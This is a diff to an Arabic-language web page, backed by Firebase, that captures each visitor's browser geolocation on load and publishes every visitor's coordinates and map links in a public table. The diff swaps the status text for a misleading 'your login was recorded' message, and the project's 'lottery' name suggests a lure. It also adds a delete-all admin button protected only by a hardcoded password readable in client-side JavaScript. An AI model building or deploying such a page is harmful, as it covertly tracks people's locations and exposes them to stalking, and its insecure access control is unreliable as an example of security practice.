@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سجل مواقع الزوار</title>
+    <title>سجل مواقع الزوار - Admin</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; text-align: center; padding: 20px; }
         .container { max-width: 900px; margin: auto; background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
@@ -15,8 +15,13 @@
         th { background-color: #1a73e8; color: white; }
         
         .map-btn { background-color: #34a853; color: white; padding: 8px 16px; text-decoration: none; border-radius: 5px; font-size: 14px; display: inline-block; }
-        .map-btn:hover { background-color: #2d8e47; }
         tr:hover { background-color: #f8f9fa; }
+
+        /* Admin Section Styling */
+        .admin-section { margin-top: 40px; padding: 20px; border-top: 2px dashed #ddd; }
+        .delete-btn { background-color: #d93025; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        .delete-btn:hover { background-color: #a50e0e; }
+        input[type="password"] { padding: 10px; border: 1px solid #ccc; border-radius: 5px; margin-left: 10px; }
     </style>
 </head>
 <body>
@@ -29,22 +34,25 @@
         <thead>
             <tr>
                 <th>الوقت والتاريخ</th>
-                <th>خط العرض (Latitude)</th>
-                <th>خط الطول (Longitude)</th>
+                <th>خط العرض (Lat)</th>
+                <th>خط الطول (Lng)</th>
                 <th>الخريطة</th>
             </tr>
         </thead>
-        <tbody id="log-table">
-            </tbody>
+        <tbody id="log-table"></tbody>
     </table>
+
+    <div class="admin-section">
+        <h3>لوحة تحكم المسؤول</h3>
+        <input type="password" id="adminPass" placeholder="كلمة المرور">
+        <button class="delete-btn" id="deleteBtn">حذف جميع البيانات</button>
+    </div>
 </div>
 
 <script type="module">
-  // 1. Import required Firebase v12 functions
   import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
-  import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";
+  import { getDatabase, ref, push, onValue, remove } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";
 
-  // 2. Your specific configuration
   const firebaseConfig = {
     apiKey: "AIzaSyA15ZYVyMWVNwLMwhSME_brqjDdO7thW78",
     authDomain: "lottery-aa0db.firebaseapp.com",
@@ -55,70 +63,60 @@
     measurementId: "G-X3X7SCF2BG"
   };
 
-  // 3. Initialize Firebase & Database
   const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
   const visitsRef = ref(db, 'visitor_logs');
 
-  const statusDiv = document.getElementById('status');
-  const tableBody = document.getElementById('log-table');
+  // --- DELETE LOGIC ---
+  const MASTER_PASSWORD = "mysecretpassword123"; // CHANGE THIS PASSWORD
 
-  // 4. Function to get and save location
+  document.getElementById('deleteBtn').addEventListener('click', () => {
+      const enteredPass = document.getElementById('adminPass').value;
+      if (enteredPass === MASTER_PASSWORD) {
+          if (confirm("هل أنت متأكد من حذف جميع السجلات؟ لا يمكن التراجع!")) {
+              remove(visitsRef)
+              .then(() => alert("تم حذف جميع البيانات بنجاح."))
+              .catch((err) => alert("حدث خطأ: " + err));
+          }
+      } else {
+          alert("كلمة مرور خاطئة!");
+      }
+  });
+
+  // --- EXISTING LOGIC ---
   function logLocation() {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition((position) => {
-        const lat = position.coords.latitude;
-        const lng = position.coords.longitude;
-        const time = new Date().toLocaleString('ar-EG');
-
-        // Save to Firebase Realtime Database
         push(visitsRef, {
-          latitude: lat,
-          longitude: lng,
-          timestamp: time
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          timestamp: new Date().toLocaleString('ar-EG')
         });
-
-        statusDiv.innerHTML = `تم حفظ موقعك بنجاح! <br> خط العرض: ${lat} | خط الطول: ${lng}`;
-        statusDiv.style.background = "#e6fffa";
-        statusDiv.style.color = "#2c7a7b";
-      }, (error) => {
-        statusDiv.innerText = "خطأ: يرجى السماح للمتصفح بالوصول للموقع.";
-        statusDiv.style.background = "#fff5f5";
-        statusDiv.style.color = "#c53030";
+        document.getElementById('status').innerText = "تم تسجيل دخولك بنجاح.";
+      }, () => {
+        document.getElementById('status').innerText = "فشل في الحصول على الموقع.";
       });
-    } else {
-      statusDiv.innerText = "متصفحك لا يدعم خاصية تحديد الموقع.";
     }
   }
 
-  // 5. Listen for database updates and fill the table
   onValue(visitsRef, (snapshot) => {
-    tableBody.innerHTML = ""; // Clear existing rows
+    const tableBody = document.getElementById('log-table');
+    tableBody.innerHTML = "";
     const data = snapshot.val();
-    
     if (data) {
-        // Convert object to array and reverse to show newest first
-        const entries = Object.values(data).reverse();
-        
-        entries.forEach(entry => {
-            const row = `
+        Object.values(data).reverse().forEach(entry => {
+            tableBody.innerHTML += `
                 <tr>
                     <td>${entry.timestamp}</td>
                     <td>${entry.latitude.toFixed(6)}</td>
                     <td>${entry.longitude.toFixed(6)}</td>
-                    <td>
-                        <a href="https://www.google.com/maps?q=${entry.latitude},${entry.longitude}" 
-                           target="_blank" class="map-btn">فتح الخريطة</a>
-                    </td>
-                </tr>
-            `;
-            tableBody.innerHTML += row;
+                    <td><a href="https://www.google.com/maps?q=${entry.latitude},${entry.longitude}" target="_blank" class="map-btn">فتح الخريطة</a></td>
+                </tr>`;
         });
     }
   });
 
-  // Start tracking on load
-  logLocation();
+  window.onload = logLocation;
 </script>
 
 </body>
